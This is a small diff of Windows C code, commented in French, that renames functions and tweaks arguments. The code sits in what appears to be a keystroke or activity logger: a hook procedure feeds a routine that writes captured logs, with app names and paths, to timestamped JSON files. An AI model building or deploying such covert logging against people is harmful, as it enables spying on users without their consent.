@@ -106,7 +106,7 @@ LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)
         }
     }
 
-    return CallNextHookEx(NULL, code, wParam, lParam);
+    return CallNextHookEx(0, code, wParam, lParam);
 }
 /********************************************************************************************************************************************************/
 VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode)
@@ -119,7 +119,7 @@ VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode)
     logsUTF8 = encode_UTF8(logsUnicode);
     appNameUTF8 = encode_UTF8(appNameUnicode);
     pathUTF8 = encode_UTF8(pathUnicode);
-    createdJsonObject = CreateJsonObjectLogs(logsUTF8, appNameUTF8, pathUTF8);
+    createdJsonObject = CreateJsonLogsObject(logsUTF8, appNameUTF8, pathUTF8);
     WriteJsonObjectLogs(createdJsonObject);
 
     HeapFree(GetProcessHeap(), NULL, logsUTF8);
@@ -127,7 +127,7 @@ VOID WriteLogs(PWCHAR logsUnicode, PWCHAR appNameUnicode, PWCHAR pathUnicode)
 }
 /********************************************************************************************************************************************************/
 //Fonction qui crée un objet javascript contenant les logs
-cJSON* CreateJsonObjectLogs(PCHAR logs, PCHAR app, PCHAR path)
+cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path)
 {
     cJSON* object = NULL;
     PCHAR jsonString = NULL;
@@ -167,7 +167,7 @@ VOID WriteJsonObjectLogs(cJSON* newJsonObject)
     system_time.wMilliseconds = 0;
 
     //Le nom du fichier sera le timestamp du jour
-    wsprintf(filename, L"%ls\\%ld.json", DATA_FOLDER, SystemTimeToUnixTimestamp(system_time));
+    wsprintf(filename, L"%ls\\%ld.json", DATA_FOLDER_W, SystemTimeToUnixTimestamp(system_time));
 
     //On ouvre le fichier
     if ((hJsonFile = CreateFile(filename, FILE_GENERIC_READ|FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
